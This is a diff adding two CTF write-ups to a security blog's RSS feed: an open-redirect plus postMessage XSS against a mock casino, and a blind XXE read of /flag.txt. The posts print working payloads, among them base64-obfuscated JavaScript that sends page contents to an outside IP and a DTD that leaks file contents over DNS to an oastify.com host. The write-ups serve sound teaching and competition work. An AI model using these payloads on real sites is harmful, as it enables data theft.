@@ -6,8 +6,202 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Tue, 12 Jul 2022 13:02:46 +0200</lastBuildDate>
+        <lastBuildDate>Sun, 25 Dec 2022 02:09:19 +0100</lastBuildDate>
         <atom:link href="https://SpawnZii.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>[Avent ESNA] Web - 777 Cyber casino</title>
+            <link>https://SpawnZii.github.io/posts/2022/12/avent-esna-web-777-cyber-casino/</link>
+            <pubDate>Sun, 25 Dec 2022 02:09:19 +0100</pubDate>
+            
+            <guid>https://SpawnZii.github.io/posts/2022/12/avent-esna-web-777-cyber-casino/</guid>
+            <description>Introduction Every year ESNA organizes a CTF as an advent calendar, so there is a new challenge every day on a different theme, like pwn, forensic, programming, reverse and web. To motivate students to participate, the TOP 8 of the general ranking will be selected to participate in the CTF of EC2. The challenges are proposed by Worty &amp;amp; iHuggsy, but also by other trusted students ;).
+I was lucky enough to be able to create a challenge for the occasion, so I will start with this one.</description>
+            <content type="html"><![CDATA[<hr>
+<h2 id="introduction">Introduction</h2>
+<p>Every year ESNA organizes a CTF as an advent calendar, so there is a new challenge every day on a different theme, like pwn, forensic, programming, reverse and web. To motivate students to participate, the TOP 8 of the general ranking will be selected to participate in the CTF of EC2. The challenges are proposed by Worty &amp; iHuggsy, but also by other trusted students ;).</p>
+<p><img src="/posts/777/home.png" alt="form"></p>
+<p>I was lucky enough to be able to create a challenge for the occasion, so I will start with this one.</p>
+<hr>
+<h2 id="web-1--777-cyber-casino">Web-1 : 777 Cyber Casino</h2>
+<ul>
+<li><strong>Description</strong>: &ldquo;<em>Un casino en ligne va ouvrir ces portes, vous avez été mandaté pour le pentest.</em>&rdquo;</li>
+<li><strong>Solves</strong>: 6</li>
+<li><strong>Difficulty</strong>: <del>Easy</del> Medium</li>
+<li><strong>Author</strong> : SpawnZii</li>
+</ul>
+<hr>
+<p><img src="/posts/777/homecas.png" alt="form"></p>
+<p>The site represents an online casino, there are several features:</p>
+<ul>
+<li>A login/register page.</li>
+<li>Pages with roulette and slot machine games.</li>
+<li>A user page with an identity verification form .</li>
+</ul>
+<h2 id="inspection-of-login-requests">Inspection of login requests.</h2>
+<p>The first thing we could notice on the login is the presence of a <code>url</code> parameter.</p>
+<p><img src="/posts/777/or.png" alt="form"></p>
+<p>Which makes us think of the exploitation of an open redirect and thus of a potential client vulnerability.
+Inspection of the account page.</p>
+<p>On the account.php page we find a file upload form and a verification id button.</p>
+<p><img src="/posts/777/account.png" alt="form"></p>
+<p>After some attempts on the file upload we realize that it is not vulnerable. It allows the user to upload his ID and retrieve it via a url.</p>
+<h2 id="inspection-of-verification-request">Inspection of verification request.</h2>
+<p>This function takes as parameter the url of the file uploaded by the user.</p>
+<p><img src="/posts/777/verif.png" alt="form"></p>
+<p>When trying to modify the url sent, like this <code>document_url=https://spawnzii.fr/?ping</code> we realize that the backend filters the url and we see an error message.</p>
+<p><img src="/posts/777/error.png" alt="form"></p>
+<p>We will try to play with the parser to send a different url. There were several possibilities.</p>
+<ul>
+<li>Use the open redirect found before.</li>
+<li>Trick the url with <code>@</code> <strong>https://ů.cc@www.google.com</strong>.</li>
+<li>Create a subdomain like this : <code>ů.cc.spawnzii.fr</code>.</li>
+</ul>
+<p>Here I will choose to use the open redirect, we must first bypass the parser on the url parameter. After some attempts we quickly understand that the backend only verifies that the domain name is present in the url. We can therefore use <code>https://xn--3ga.cc/login.php?url=https://www.google.com/?xn--3ga.cc</code> as a payload.</p>
+<p><img src="/posts/777/bypass.png" alt="form"></p>
+<p>We can try to send the following request to learn more about the process.</p>
+<p><img src="/posts/777/bot.png" alt="form"></p>
+<p>One minute later we receive our ping on our netcat.</p>
+<p><img src="/posts/777/pong.png" alt="form"></p>
+<p>We can now validate that we need to exploit a client attack.</p>
+<h2 id="find-the-xss">Find the XSS.</h2>
+<p>By inspecting the source code of the roulette we find a button calling two javascript functions.</p>
+<p><img src="/posts/777/btn.png" alt="form"></p>
+<h2 id="play-function">Play() function.</h2>
+<p>This function will create an iframe from the following url <code>https://ů.cc/table2.php</code> if the iframe is not already present.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">play</span>(){
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;table2&#39;</span>)){
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">table</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;iframe&#39;</span>);
+        <span style="color:#a6e22e">table</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#34;src&#34;</span>,<span style="color:#e6db74">&#34;https://ů.cc/table2.php&#34;</span>);
+        <span style="color:#a6e22e">table</span>.<span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;table2&#39;</span>;
+        <span style="color:#a6e22e">table</span>.<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">width</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1900px&#34;</span>;
+        <span style="color:#a6e22e">table</span>.<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">height</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;500px&#34;</span>;
+        <span style="color:#a6e22e">table</span>.<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">border</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;none&#34;</span>;
+        document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">table</span>);
+        
+    }
+    <span style="color:#66d9ef">else</span>{
+        <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;You can play on two tables maximum&#39;</span>)
+    }
+}
+</code></pre></div><h2 id="sendvalue-function">sendValue() function.</h2>
+<p>This function allows to transfer the amount of the balance of the user to the iframe via a post message.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sendValue</span>(){
+    <span style="color:#66d9ef">if</span>(document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;table2&#39;</span>)){
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">message</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bankValue</span>;
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">iframe</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;iframe&#34;</span>);
+    <span style="color:#a6e22e">iframe</span>.<span style="color:#a6e22e">contentWindow</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#a6e22e">message</span>, <span style="color:#e6db74">&#34;*&#34;</span>);
+    }
+}
+
+window.<span style="color:#a6e22e">setInterval</span>(<span style="color:#66d9ef">function</span>(){
+    <span style="color:#a6e22e">sendValue</span>();
+  },
+</code></pre></div><h2 id="analysis-of-table2php">Analysis of table2.php</h2>
+<p>On the table2.php page we found this script:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+  window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;message&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">event</span>) {
+	  document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;bankSpan&#39;</span>).<span style="color:#a6e22e">innerHTML</span><span style="color:#f92672">=</span><span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>;
+	  <span style="color:#a6e22e">bankValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>; 
+	});
+<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</code></pre></div><p>As you may have guessed, we are going to use an <strong>postmessage vulnerabilite</strong> :) As the add event listener does not verify the origin of the message, we will be able to send our own message which will be inserted in an innerHTML.</p>
+<ul>
+<li>First step make a request on account.php :</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;//xn--3ga.cc/account.php&#34;</span>, <span style="color:#66d9ef">false</span>);
+<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>();
+
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">responseText</span>;
+document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://161.97.163.247:4444/?flag=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">responseText</span>);
+
+</code></pre></div><ul>
+<li>Create an iframe that will send our payload ans place it on your web server:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://xn--3ga.cc/table2.php&#34;</span> 
+<span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;this.contentWindow.postMessage(&#39;&lt;img/src/onerror=eval(atob(&#34;</span>
+<span style="color:#a6e22e">dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4a</span>
+<span style="color:#a6e22e">HIub3BlbigiR0VUIiwgIi8veG4tLTNnYS5jYy9hY2NvdW50LnBocCIsIGZ</span>
+<span style="color:#a6e22e">hbHNlKTsKeGhyLnNlbmQoKTsKCmxldCB4ID0geGhyLnJl</span>
+<span style="color:#a6e22e">c3BvbnNlVGV4dDsKZG9jdW1lbnQubG9jYXRpb249Imh0d</span>
+<span style="color:#a6e22e">HA6Ly8xNjEuOTcuMTYzLjI0Nzo0NDQ0Lz9mbGFnPSIrYn</span>
+<span style="color:#a6e22e">RvYSh4aHIucmVzcG9uc2VUZXh0KTs</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;))&gt;&#39;,&#39;*&#39;)&#34;</span><span style="color:#f92672">&gt;</span>
+</code></pre></div><ul>
+<li>We can send the payload to the bot.</li>
+</ul>
+<p><img src="/posts/777/final.png" alt="form"></p>
+<p>And we got the flag :)</p>
+<p><img src="/posts/777/flag.png" alt="form"></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>[Avent ESNA] Web - Papa noël gère ses documents Introduction</title>
+            <link>https://SpawnZii.github.io/posts/2022/12/avent-esna-web-papa-no%C3%ABl-g%C3%A8re-ses-documents-introduction/</link>
+            <pubDate>Sun, 25 Dec 2022 02:04:10 +0100</pubDate>
+            
+            <guid>https://SpawnZii.github.io/posts/2022/12/avent-esna-web-papa-no%C3%ABl-g%C3%A8re-ses-documents-introduction/</guid>
+            <description>Introduction Every year ESNA organizes a CTF as an advent calendar, so there is a new challenge every day on a different theme, like pwn, forensic, programming, reverse and web. To motivate students to participate, the TOP 8 of the general ranking will be selected to participate in the CTF of EC2. The challenges are proposed by Worty &amp;amp; iHuggsy, but also by other trusted students ;).
+I will try to explain you how I solved the web challenge.</description>
+            <content type="html"><![CDATA[<hr>
+<h2 id="introduction">Introduction</h2>
+<p>Every year ESNA organizes a CTF as an advent calendar, so there is a new challenge every day on a different theme, like pwn, forensic, programming, reverse and web. To motivate students to participate, the TOP 8 of the general ranking will be selected to participate in the CTF of EC2. The challenges are proposed by Worty &amp; iHuggsy, but also by other trusted students ;).</p>
+<p>I will try to explain you how I solved the web challenge.</p>
+<hr>
+<ul>
+<li><strong>Description</strong> : &ldquo;<em>Papa noël a développé une appli (et oui encore) accessible en interne pour ses lutins. Cette application sert à stocker les documents, et il est possible de les rechercher via leur nom. Vous êtes un lutin malveillant et vous voulez accéder au fichier secret “flag.txt” qui se trouve à la racine. Trouvez un moyen d’exploiter cette application pour y arriver.</em>&rdquo;</li>
+<li><strong>Solves</strong> : 6</li>
+<li><strong>Difficulty</strong> : Medium</li>
+<li><strong>Author</strong> : Worty</li>
+</ul>
+<hr>
+<h2 id="recon">Recon</h2>
+<p>On the site we have two different endpoints:</p>
+<ul>
+<li>The first allows us to upload a file, which is renamed and sent to a /upload folder.</li>
+<li>The second allows us to search on the name of the upload files.</li>
+</ul>
+<p>The first thing we notice is that the server responds in <strong>xml</strong>.</p>
+<p><img src="/posts/xxe/se.png" alt="form"></p>
+<p>We start by testing the most classic payloads, without success.</p>
+<p><img src="/posts/xxe/test.png" alt="form"></p>
+<p>My first reflex was to test for an OOB XXE. So we have to load a <strong>dtd</strong> file from our web server, so we test if the machine can access the internet.</p>
+<p><img src="/posts/xxe/test2.png" alt="form"></p>
+<p>I immediately noticed that there were only <strong>DNS</strong> requests and no <strong>HTTP</strong> requests. Which means that it will be impossible to load our dtd from the internet.</p>
+<p><img src="/posts/xxe/collab.png" alt="form"></p>
+<p>And him, do we forget him ?</p>
+<p><img src="/posts/xxe/up.png" alt="form"></p>
+<p>You understood, we will be able to upload our <strong>dtd</strong> here and fetch it locally.</p>
+<p>## Exploitation of an BLIND XXE with DNS exfiltration.</p>
+<ul>
+<li>On the search use the following payload :</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE r [
+</span><span style="color:#75715e">&lt;!ELEMENT r ANY &gt;</span>
+<span style="color:#75715e">&lt;!ENTITY % sp SYSTEM &#34;file:///var/www/html/uploads/c8902d1504e3022524e0120ff3c844.dtd&#34;&gt;</span>
+%sp;
+%param1;
+]&gt;
+<span style="color:#f92672">&lt;data&gt;&lt;search&gt;</span>
+&amp;attack;<span style="color:#f92672">&lt;/search&gt;&lt;limit&gt;</span>10<span style="color:#f92672">&lt;/limit&gt;&lt;/data&gt;</span>
+</code></pre></div><p><img src="/posts/xxe/pld.png" alt="form"></p>
+<ul>
+<li>Upload the a file call file.dtd with the following content :</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!ENTITY % vuln1 SYSTEM &#34;php://filter/convert.base64-encode/resource=/flag.txt&#34;&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY % vuln2 &#34;&lt;!ENTITY attack SYSTEM &#39;http://%vuln1;.s81wuau8i8pw9w2gu5ko83yfs6yxmpae.oastify.com/&#39;&gt;</span>&#34;&gt;
+%vuln2;
+</code></pre></div><p><img src="/posts/xxe/dtd.png" alt="form"></p>
+<ul>
+<li>Copy the filename on your search payload.</li>
+<li>Send the request and get the flag via DNS exfiltration ;).</li>
+</ul>
+<p><img src="/posts/xxe/flagdns.png" alt="form"></p>
+<p><img src="/posts/xxe/flag.png" alt="form"></p>
+]]></content>
+        </item>
         
         <item>
             <title>How we have pwned Root-Me in 2022</title>
